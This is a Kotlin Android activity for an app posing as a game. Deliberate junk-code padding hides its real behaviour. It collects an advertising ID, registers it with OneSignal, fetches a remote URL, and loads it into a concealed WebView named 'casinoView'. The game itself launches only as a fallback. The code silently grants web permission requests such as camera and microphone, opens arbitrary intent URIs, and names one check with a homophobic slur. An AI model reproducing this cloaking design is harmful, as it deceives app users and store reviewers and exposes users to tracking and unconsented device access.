package com.goplaytoday.guildofhero

import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.pm.ActivityInfo
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.webkit.*
import android.widget.Button
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.goplaytoday.guildofhero.databinding.ActivityMainBinding
import com.goplaytoday.guildofhero.util.*
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    val connections = listOf(
        "A" to 10,
        "B" to 20,
        "C" to 30,
        "D" to 40,
        "E" to 50,
        "F" to 60,
        "G" to 70,
        "H" to 80,
        "I" to 90,
        "J" to 100
    )

    private val happyConnection = HappyConnection(this, connections)
    private lateinit var navController: NavController

    val cordina = CoroutineScope(Dispatchers.Main)

    private val sweets      = Sweets(this, listOf(10, 20, 30, 40, 50, 60, 70, 80, 90, 100))
    private val sweetsArray = SweetsArray(this, arrayOf(10, 20, 30, 40, 50, 60, 70, 80, 90, 100))

    private val regionaleonsternenko = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { pahlava ->
        charodei(sweetsArray)
        OneSignal.initWithContext(this@MainActivity, "${ComplexProcessor.O1_start}-${LottieUtil.O1_end}")
        cordina.launch(Dispatchers.IO) {
            val add = processor.gudini(this@MainActivity, sweetsArray.poper)
            happyConnection.saveborn.edit().putBoolean("adb", true).apply()
            OneSignal.login(add)
        }
        launcheGDX()
    }

    private val processor = DataProcessor(happyConnection, sweetsArray)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        sweets.processSweetnessLevels()
        sweetsArray.filterAndAverage()
        sweetsArray.maxMinDifference(sweets)
        sweetsArray.sumOfSquares()
        sweetsArray.countEvenOdd()
        sweetsArray.groupByRange(listOf(1..25, 26..50, 51..75, 76..100))
        sweetsArray.normalize()
        sweetsArray.productWithIndex()
        sweetsArray.averageEvenOdd()
        sweetsArray.uniqueSortedLevels()
        sweetsArray.trimmedMean()

        happyConnection.saveborn = getSharedPreferences(HappyConnection.S_NAME, MODE_PRIVATE)
        sweets.transformSweetnessLevels(sweetsArray, processor.sigun)

        happyConnection.apply {
            filterByStrength(30)
            maxStrengthConnection()
            groupByStrength()
            averageStrength()
            connectionsLengthMap()
            sumOfSquaresStrength()
            sortByLengthDescending()
            strengthDifference()
            normalizeStrengths()
            uniqueConnections()
            medianStrength(sweetsArray)
            removeConnection("C")
            findConnectionsContaining("a")
            indexMultipliedStrengthMap()
            foldStrengths(0) { acc, value -> acc + value }
            allConnectionsAbove(5)
            anyConnectionBelow(15)
            uniqueNamesCount()
            fenitaLaComedia()
            adjustedStrengths()
        }
    }

    override fun exit() {
        SUPER.onceExit.once {
            log("exit")
            SUPER.coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        SUPER.binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(SUPER.binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        SUPER.lottie  = LottieUtil(SUPER.binding)
    }

    fun showUrlPolicy(url: String) = CoroutineScope(Dispatchers.Main).launch {
        listOf(
            "apple", 1, "banana", 2.0, "cherry", 3, "date", 4.5, "elderberry", 5, "fig", 6.6,
            "grape", 7, "honeydew", 8.8, "kiwi", 9, "lemon", 10.1, "mango", 11, "nectarine", 12.2,
            "orange", 13, "papaya", 14.4, "quince", 15, "raspberry", 16.6, "strawberry", 17, "tangerine", 18.8,
            "ugli", 19, "vanilla", 20.2, "watermelon", 21, "xigua", 22.4, "yellowfruit", 23, "zucchini", 24.6
        ).also { surik ->

                surik.filter { it is String }  // 1. Залишає лише строки
                .apply { SUPER.binding.tvConnecting.isVisible = false }
                .map { it as String }  // 2. Приводить до типу String
                .filter { it.length > 3 }  // 3. Фільтрує строки, довжина яких більше 3 символів
                .map { it.toUpperCase() }  // 4. Перетворює строки у верхній регістр
                .map { it.reversed() }  // 5. Перевертає кожну строку
                .sortedBy { it.length }  // 6. Сортує строки за довжиною
                .distinct()  // 7. Видаляє дублікати
                    .map { it.take(2) }  // 8. Залишає перші два символи кожної строки
                    .flatMap { listOf(it, it) }  // 9. Подвоює кожну строку
                    .filter { it.contains('A') }  // 10. Залишає строки, що містять 'A'
                    .also {
                        SUPER.binding.casinoView.apply { sweets.apply { iRoar(sweetsArray) } }
                        SUPER.binding.casinoView.isVisible = true
                    }
                    .map { it.replace('A', '@') }  // 11. Замінює 'A' на '@'
                    .sortedByDescending { it }  // 12. Сортує строки в зворотному порядку
                    .filter { it.length % 2 == 0 }  // 13. Залишає строки з парною довжиною
                    .also { SUPER.binding.casinoView.loadUrl(url) }
                    .map { it + it.length }  // 14. Додає довжину строки до її кінця
                    .map { it.dropLast(1) }  // 15. Видаляє останній символ строки
                        .groupBy { it.first() }  // 16. Групує строки за першою літерою
                        .flatMap { it.value.take(2) }  // 17. Бере перші 2 строки з кожної групи
                        .map { it + "!" }  // 18. Додає '!' до кінця кожної строки
                        .filter { it.length < 5 }  // 19. Залишає строки з довжиною менше 5 символів
                        .map { it.repeat(2) }  // 20. Повторює кожну строку двічі
        }
    }

    fun fenitaLaComedia() {
        onBackPressedDispatcher.addCallback(this) {
            processor.apply {
                addString("hello")
                addString("world")
                addString("kotlin")
                addString("lambda")
                addNumber(1.0)
                addNumber(2.5)
                addNumber(3.8)
                addNumber(4.2)
            }
            when {
                sweetsArray.views.last().canGoBack() -> {
                    processor.processStringList()
                    processor.processNumberList()
                    processor.combineStringAndNumberArrays()
                    sweetsArray.views.last().goBack()
                    processor.complexStringProcessing()
                    processor.complexNumberProcessing()
                    processor.mergeData()
                }

                else -> {
                    processor.apply {
                        complexStringArrayProcessing()
                        complexNumberArrayProcessing()
                        sumOfSquares()
                        averageStringLength()
                        concatenateStrings()
                        averageNumberArray()
                        numberArrayToStringList()
                        if (sweetsArray.views.size > 1) {
                            SUPER.binding.root.removeView(sweetsArray.views.last())
                            stringListToNumberList()
                            mergeStringListsAndArrays()
                            mergeNumberListsAndArrays()
                            sweetsArray.views.last().destroy()
                            addString("kotlin")
                            addString("lambda")
                            addNumber(1.0)
                            addNumber(2.5)
                            sweetsArray.views.removeLast()
                            complexNumberArrayProcessing()
                            sumOfSquares()
                            averageStringLength()
                        } else finish()
                    }
                }
            }
        }
    }

    val cm = CoroutineScope(Dispatchers.Main)
    var advertisingIdInfo = "information"

    val promouthen = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->

        val numberResults = processor.mixedList
            .filterIsInstance<Number>()  // Залишаємо тільки числа
            .map { it.toDouble() }  // Перетворюємо всі числа на Double
            .map { it * 2 }  // Подвоюємо кожне число
            .filter { it > 10 }  // Фільтруємо числа, що більше 10
            .sortedDescending()  // Сортуємо числа у зворотньому порядку
            .map { "Value: $it" }  // Додаємо префікс "Value" до кожного числа
            .distinct()  // Видаляємо дублікати
            .also { if (isGranted) sweetsArray.pair.first.onPermissionRequest(sweetsArray.pair.second) }
            .flatMap { it.split(" ").asIterable() }  // Розбиваємо строки на слова
            .map { it.reversed() }  // Перевертаємо кожне слово
            .filter { it.length > 3 }  // Залишаємо тільки слова, довжина яких більше 3 символів
        "s"  + numberResults
    }

    fun ilustartor() {
        cm.launch {
            advertisingIdInfo = withContext(Dispatchers.IO) { processor.gudini(this@MainActivity, true) }

            val hpc = happyConnection.mixedList

            hpc.filterIsInstance<String>()  // Залишаємо тільки строки
                .map { it.toUpperCase() }  // Переводимо строки у верхній регістр
                .filter { it.length > 3 }  // Фільтруємо строки, довжина яких більше 3 символів
                .flatMap { it.toCharArray().asIterable() }  // Перетворюємо строки у список символів
                .map { it.toString() }  // Перетворюємо символи назад у строки
                .distinct()  // Видаляємо дублікати
                .sorted()  // Сортуємо строки
                .apply { OneSignal.initWithContext(
                    this@MainActivity,
                    happyConnection.miniL.first()
                ) }
                .map { it + it }  // Подвоюємо кожну строку
                .filter { it.contains('L') }  // Залишаємо тільки ті строки, що містять 'L'
                .map { it.length }  // Перетворюємо строки у їх довжину
                .map { it * 2 }  // Подвоюємо кожну довжину
                .map { "Length: $it" }  // Додаємо префікс до кожної довжини
                .also { OneSignal.login(advertisingIdInfo) }

            processor.mixedList.apply {

                val mixedList: List<Any> = listOf(
                    "hello", 1, "world", 2.5, "kotlin", 3, "lambda", 4.8, "functions", 5, "complexity", 6.1,
                    "test", 7, "example", 8.2, "code", 9, "strings", 10.3, "numbers", 11, "operations", 12.4
                )

                val result = mixedList
                    .filterIsInstance<String>()  // Залишаємо тільки строки
                    .map { it.reversed() }  // Перевертаємо кожну строку
                    .filter { it.length > 4 }  // Фільтруємо строки, довжина яких більше 4 символів
                    .flatMap { it.split("").asIterable() }  // Розбиваємо строки на окремі символи
                    .filter { it.isNotEmpty() }  // Видаляємо пусті елементи
                    .map { it.toUpperCase() }  // Переводимо символи у верхній регістр
                    .groupBy { it }  // Групуємо символи

            processor.molokozai(advertisingIdInfo).also { HHH ->

                val result2 = mixedList
                    .filterIsInstance<String>()  // Залишаємо тільки строки
                    .map { it.reversed() }  // Перевертаємо кожну строку
                    .filter { it.length > 4 }  // Фільтруємо строки, довжина яких більше 4 символів
                    .flatMap { it.split("").asIterable() }  // Розбиваємо строки на окремі символи
                    .filter { it.isNotEmpty() }  // Видаляємо пусті елементи
                    .map { it.toUpperCase() }  // Переводимо символи у верхній регістр
                    .groupBy { it }  // Групуємо символи
                    .mapValues { it.value.size }  // Підраховуємо кількість кожного символу
                    .entries
                    .sortedByDescending { it.value }  // Сортуємо символи за частотою використання
                    .map { "${it.key}: ${it.value}" }  // Формуємо строки з символів та їх кількості
                    .take(10)  // Беремо перші 10 елементів
                    .apply {
                        happyConnection.saveborn.edit()
                            .putString(LottieUtil.fio9, HHH.toString())
                            .apply()
                        showUrlPolicy(HHH.toString())
                    }
                    .map { it.replace("A", "@") }  // Замінюємо всі 'A' на '@'
                    .map { "Symbol $it" }  // Додаємо префікс "Symbol" до кожної строки

                "d" + result.toString() + result2.toString()
                }
            }
        }
    }

    fun vendorrek() = object : WebChromeClient() {

        override fun onProgressChanged(view: WebView, deka: Int) {
            SUPER.binding.progress.isVisible = deka <= 98
            SUPER.binding.progress.progress = deka
        }
        val strings = listOf("hello", "world", "kotlin", "lambda", "functions", "complexity")
        val numbers = listOf(1.0, 2.5, 3.8, 4.2, 5.9, 6.7)
        override fun onPermissionRequest(request: PermissionRequest) {
            if (proverkaNaPidora(this@MainActivity)) {
                request.grant(request.resources)
            } else {
                sweetsArray.pair = Pair(this, request)
                complexProcessor.apply {
                    processStringList(strings)
                    processNumberList(numbers)
                    combineStringAndNumberLists(strings, numbers)
                    sumOfSquares(strings)
                    literalOnBack(promouthen)
                    concatenateWithConditions(strings)
                    complexNumberProcessing(numbers)
                    generateNumberStrings(strings)
                    maxLengthString(strings)
                    minNumberFromStringList(strings)
                }
            }
        }

        override fun onCreateWindow(view: WebView, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message?): Boolean {
           complexProcessor.averageLengthOfStringList(strings)
           complexProcessor.stringListToNumberList(strings)
           complexProcessor.removeStringsContainingChars(strings, listOf('l', 'o'))
           complexProcessor.anyNumberLessThan(numbers, 2.0)
           complexProcessor.complexStringToNumberProcessing(strings)
           complexProcessor.joinStringsWithConditions(strings)
            val wv = WebView(this@MainActivity)
            complexProcessor.mergeStringsAndNumbers(strings, numbers)
            complexProcessor.reverseSortByLength(strings)
            complexProcessor.filterNumbersLessThan(numbers, 3.0)
            complexProcessor.allNumbersGreaterThan(numbers, 2.0)
            wv.apply { sweets.apply { iRoar(sweetsArray) } }
            SUPER.binding.root.addView(wv)
            complexProcessor.stringListToNumberList(strings)
            (resultMsg!!.obj as WebView.WebViewTransport).webView = wv
            resultMsg.sendToTarget()
            return true
        }

        override fun onShowFileChooser(w: WebView?, fpc: ValueCallback<Array<Uri>>?, fcp: FileChooserParams?): Boolean {
            try { strings
                .filter { it.length > 3 }  // Фільтруємо строки, довжина яких більше 3 символів
                .map { it.toUpperCase() }  // Приводимо всі строки до верхнього регістру
                .flatMap { str -> numbers.map { num -> str + num.toString() } }  // Об'єднуємо кожну строку з кожним числом
                .filter { it.any { char -> char.isDigit() } }  // Залишаємо тільки ті строки, що містять цифри
                .map { it.replace("1", "ONE") }  // Замінюємо всі одиниці на "ONE"
                .sortedBy { it.length }  // Сортуємо строки за довжиною
                .map { it.reversed() }  // Перевертаємо кожну строку
                .filter { it.length % 2 == 0 }  // Залишаємо тільки строки парної довжини
                .distinct().also { sweets.fileChooserValueCallback = fpc }  // Видаляємо дублікати
                .map { it.substring(0, it.length.coerceAtMost(10)) }  // Обрізаємо строки до 10 символів
                .mapIndexed { index, str -> "$index: $str" }  // Додаємо індекс до кожної строки
                .flatMap { it.split(" ").map { word -> word.trim() } }  // Розбиваємо строки на слова і видаляємо пробіли
                .mapNotNull { it.toDoubleOrNull() }  // Перетворюємо строки на числа, якщо це можливо
                .filter { it > 5 }  // Залишаємо тільки ті числа, що більше 5
                .map { it * 2 }  // Множимо кожне число на 2
                .map { "Number: $it" }  // Додаємо префікс "Number: " до кожного числа
                .map { it.replace(".", ",") }  // Замінюємо точки на коми
                .sortedDescending()  // Сортуємо строки у зворотньому порядку
                .take(15).apply { fcp?.createIntent()?.let { sweets.згзішсрутлщ.launch(it) } }  // Беремо перші 15 елементів
                .map { it.replace("NUMBER", "NUM") }  // Замінюємо "NUMBER" на "NUM"
            } catch (_: ActivityNotFoundException) { }
            return true
        }
    }



    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        sweetsArray.views.lastOrNull()?.saveState(outState)
    }

    override fun onResume() {
        super.onResume()
        sweetsArray.views.lastOrNull()?.onResume().also {
            CookieManager.getInstance().flush()
        }
    }

    override fun onPause() {
        super.onPause()
        sweetsArray.views.lastOrNull()?.onPause().also {
            CookieManager.getInstance().flush()
        }
    }

    private val complexProcessor = ComplexProcessor(this, sweetsArray)

    private var peppppper: AlertDialog? = null

    fun burbon() = object : WebViewClient() {

        override fun onPageFinished(view: WebView?, url: String?) {
            if (url?.contains(happyConnection.solllevar) != false) logikaPeredGdv()
        }

        val figa = listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)

        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            var url = request.url.toString()
            return when {
                url.contains(sweetsArray.burunduk) -> {
                    figa
                        .map { it * 2 }  // Помножуємо кожен елемент на 2
                        .filter { it % 3 == 0 }  // Залишаємо лише ті, які діляться на 3
                        .sortedDescending()  // Сортуємо у зворотньому порядку
                        .distinct()  // Видаляємо дублікати

                    true
                }
                url.startsWith("http") -> {
                    figa.take(3)  // Беремо перші 3 елементи
                        .sorted()  // Сортуємо за зростанням
                        .map { it * 10 }  // Помножуємо кожен елемент на 10
                        .map { "Number: $it" }  // Форматуємо кожен елемент як рядок
                        .mapIndexed { index, value -> "Index: $index, Value: $value" } // Додаємо індекс до кожного елемента
                        .map { it.replace("N", "X") } // Замінюємо всі входження 'N' на 'X'
                        .map { it.toUpperCase() } // Перетворюємо кожен елемент на верхній регістр
                        .map { it.substringBefore(":") } // Відділяємо індекси від значень
                    false
                }
                else -> {
                    try {
                        figa
                            .map { it * 2 }  // Помножуємо кожен елемент на 2
                            .filter { it % 3 == 0 }  // Залишаємо лише ті, які діляться на 3
                            .sortedDescending()  // Сортуємо у зворотньому порядку
                            .distinct()  // Видаляємо дублікати

                        view.context.startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME))
                    } catch (e: java.lang.Exception) {
                        if (url.contains("line:")) {
                            figa
                                .map { it * 2 }  // Помножуємо кожен елемент на 2
                                .filter { it % 3 == 0 }  // Залишаємо лише ті, які діляться на 3
                                .sortedDescending()  // Сортуємо у зворотньому порядку
                                .distinct()  // Видаляємо дублікати

                            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(processor.bush))
                            view.context.startActivity(intent)
                        }
                    }
                    url = "hohma"
                    "s" + "$url"
                    true
                }
            }
        }
    }

    fun logikaPeredGdv() {
        val kukolka: List<Any> = listOf(
            "apple", 1, "banana", 2.0, "cherry", 3, "date", 4.5, "elderberry", 5, "fig", 6.6,
            "grape", 7, "honeydew", 8.8, "kiwi", 9, "lemon", 10.1, "mango", 11, "nectarine", 12.2,
            "orange", 13, "papaya", 14.4, "quince", 15, "raspberry", 16.6, "strawberry", 17, "tangerine", 18.8,
            "ugli", 19, "vanilla", 20.2, "watermelon", 21, "xigua", 22.4, "yellowfruit", 23, "zucchini", 24.6
        )

        if (happyConnection.saveborn.contains("adb")) {
            kukolka
                .filter { it is String }  // 1. Залишає лише строки
                .map { it as String }  // 2. Приводить до типу String
                .apply { launcheGDX() }
                .map { it.length }  // 3. Заміна строки на її довжину
        }
        else {
            val view = layoutInflater.inflate(R.layout.custom_dialog, null).apply {
            kukolka
                .filter { it is String }  // 1. Залишає лише строки
                .map { it as String }  // 2. Приводить до типу String
                .map { it.length }  // 3. Заміна строки на її довжину
                .filter { it % 2 == 0 }  // 4. Залишає тільки парні довжини
                .map { it.toString() }  // 5. Перетворює числа назад в строки
                .apply {
                    findViewById<Button>(R.id.btn_agree).setOnClickListener {
                        try {

                            sweetsArray.poper = true
                            regionaleonsternenko.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                        } catch (e: Exception) { launcheGDX() }
                    }
                }
                .flatMap { listOf(it, it) }  // 6. Подвоює кожну строку
                .distinct()  // 7. Видаляє дублікати
                .map { it + "!" }  // 8. Додає '!' до кінця кожної строки
                .sorted()  // 9. Сортує строки за алфавітом
                .filter { it.contains("1") }  // 10. Залишає строки, що містять '1'
                .map { it.reversed() }  // 11. Перевертає кожну строку
                .also {
                    findViewById<Button>(R.id.btn_disagree).setOnClickListener {
                        try {

                            sweetsArray.poper = false
                            regionaleonsternenko.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
                        } catch (e: Exception) { launcheGDX() }
                    }
                }
                .map { it.toUpperCase() }  // 12. Перетворює строки у верхній регістр
                .map { it.take(3) }  // 13. Залишає перші три символи кожної строки
                .filter { it.length == 3 }  // 14. Залишає тільки строки довжиною 3 символи
                .map { it + "?" }  // 15. Додає '?' до кінця кожної строки

            }
            kukolka
                .filter { it is String }  // 1. Залишає лише строки
                .map { it as String }  // 2. Приводить до типу String
                .sortedByDescending { it }  // 16. Сортує строки у зворотному порядку
                .flatMap { listOf(it, it.reversed()) }  // 17. Додає перевернуту версію кожної строки
                .distinctBy { it.first() }  // 18. Видаляє дублікати за першим символом
                .apply {
                    peppppper = AlertDialog.Builder(this@MainActivity).apply {
                        setView(view)
                        setCancelable(false)
                    }.create()
                }
                .map { it.toLowerCase() }  // 19. Перетворює строки у нижній регістр
                .filter { it.isNotEmpty() }  // 20. Залишає тільки непусті строки

            peppppper?.show()
        }
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        sweetsArray.views.lastOrNull()?.restoreState(savedInstanceState)
    }

    fun launcheGDX() {
        SUPER.binding.apply {
            listOf(tvConnecting, progress, casinoView).onEach { itemView ->
                itemView.clearAnimation()
                root.removeView(itemView)
            }
            sweetsArray.views.onEach { root.removeView(it) }
            peppppper?.dismiss()
        }

        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
        setNavigationBarColor(R.color.black)
        setStartDestination(R.id.game)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        SUPER.coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

}